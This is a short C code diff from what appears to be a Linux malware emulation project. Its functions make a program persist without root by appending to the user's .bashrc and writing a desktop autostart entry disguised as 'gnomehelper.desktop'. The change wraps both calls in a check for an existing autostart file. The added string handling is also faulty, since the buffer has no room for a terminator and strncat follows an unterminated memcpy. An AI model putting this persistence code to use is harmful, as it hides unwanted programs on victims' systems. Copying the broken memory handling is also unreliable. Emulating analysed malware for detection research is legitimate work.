@@ -69,7 +69,6 @@ bool nonroot_bashrc_persistence() {
     strncat(fpath, HOME, strlen(HOME));
     strncat(fpath, bashrc, strlen(bashrc));
 
-    // TODO: decrypt and rotate char array for stack string to then execute write_to_file
     int fd = open(fpath, O_CREAT| O_WRONLY| O_APPEND , 0755);
     if (fd < 0) {
         return false;
@@ -249,9 +248,21 @@ bool nonroot_desktop_persistence() {
 
 bool nonroot_persistence(void) {
     // handy wraper funtion for non-root persistence.
-    // note - this is not 1:1 with how the analyzed samples call persistence methods.
-    nonroot_desktop_persistence();
-    nonroot_bashrc_persistence();
+
+    char *home = getenv("HOME");
+    char *desktop_path = "/.config/au-tostart/gnomehelper.desktop";
+    int desktop_path_size = strlen(home) + strlen(desktop_path);
+
+    char *home_desktop_path = (char *)malloc(desktop_path_size);
+    memcpy(home_desktop_path, home, strlen(home));
+    strncat(home_desktop_path, desktop_path, strlen(desktop_path));
+
+    if (access(home_desktop_path, F_OK) != 0) {
+        nonroot_desktop_persistence();
+        nonroot_bashrc_persistence();
+    }
+
+    free(home_desktop_path);
     return true;
 }
 
